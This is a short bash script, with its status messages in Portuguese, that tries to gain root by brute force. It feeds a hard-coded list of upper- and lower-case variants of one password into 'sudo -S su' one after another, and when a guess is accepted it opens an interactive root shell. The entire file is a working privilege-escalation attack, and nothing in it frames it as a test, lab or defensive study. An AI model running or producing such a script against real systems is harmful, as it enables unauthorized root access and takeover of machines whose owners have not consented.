#!/bin/bash
passwords=(
  dqm10vnc dqm10vnC dqm10vNc dqm10vNC dqm10Vnc dqm10VnC dqm10VNc dqm10VNC
  dQm10vnc dQm10vnC dQm10vNc dQm10vNC dQm10Vnc dQm10VnC dQm10VNc dQm10VNC
  Dqm10vnc Dqm10vnC Dqm10vNc Dqm10vNC Dqm10Vnc Dqm10VnC Dqm10VNc Dqm10VNC
  DQm10vnc DQm10vnC DQm10vNc DQm10vNC DQm10Vnc DQm10VnC DQm10VNc DQm10VNC
  dQM10vnc dQM10vnC dQM10vNc dQM10vNC dQM10Vnc dQM10VnC dQM10VNc dQM10VNC
  DQM10vnc DQM10vnC DQM10vNc DQM10vNC DQM10Vnc DQM10VnC DQM10VNc DQM10VNC
  dqm10VNc dQm10VNc Dqm10VNc DQm10VNc dQM10VNc DQM10VNc
  dqm10VnC dQm10VnC Dqm10VnC DQm10VnC
)
echo "[*] Iniciando tentativa de brute force com sudo su..."
for pwd in "${passwords[@]}"; do
  echo "[*] Tentando senha: $pwd"
  echo "$pwd" | sudo -S -k su -c "echo '[+] Sucesso com senha: $pwd'" 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "[+] Senha correta: $pwd"
    echo "[*] Abrindo shell como root..."
    echo "$pwd" | sudo -S su
    exit 0
  fi
done
echo "[!] Nenhuma das senhas funcionou."
